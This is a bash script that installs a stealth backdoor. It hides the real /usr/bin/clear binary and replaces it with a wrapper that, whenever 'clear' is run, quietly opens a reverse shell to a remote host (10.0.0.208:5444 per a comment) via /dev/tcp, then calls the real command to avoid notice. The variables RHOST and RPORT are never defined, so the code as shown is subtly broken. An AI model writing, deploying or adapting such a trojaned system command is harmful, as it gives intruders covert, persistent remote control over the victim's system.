#!/bin/bash

# === Reverse Shell Hook for 'clear' ===
# Reverse shell: 10.0.0.208:5444
# Drops a stealth wrapper in /usr/bin/clear
# Preserves original /usr/bin/clear as .clear.real

REAL_CLEAR="/usr/bin/.clear.real"
WRAPPED_CLEAR="/usr/bin/clear"

echo "[+] Installing stealth 'clear' hook..."

# Backup original clear if not already backed up
if [ ! -f "$REAL_CLEAR" ]; then
    echo "[+] Backing up original clear binary..."
    mv "$WRAPPED_CLEAR" "$REAL_CLEAR"
fi

# Write the stealth wrapper (correct quoting)
cat <<EOF > "$WRAPPED_CLEAR"
#!/bin/bash

# Persistent reverse shell
bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/$RHOST/$RPORT 0>&1" 2>/dev/null & disown

# Run the original clear
$REAL_CLEAR "\$@"
EOF

# Make new command executable
chmod +x "$WRAPPED_CLEAR"

echo "[+] Hook installed successfully. Listening port: $RPORT"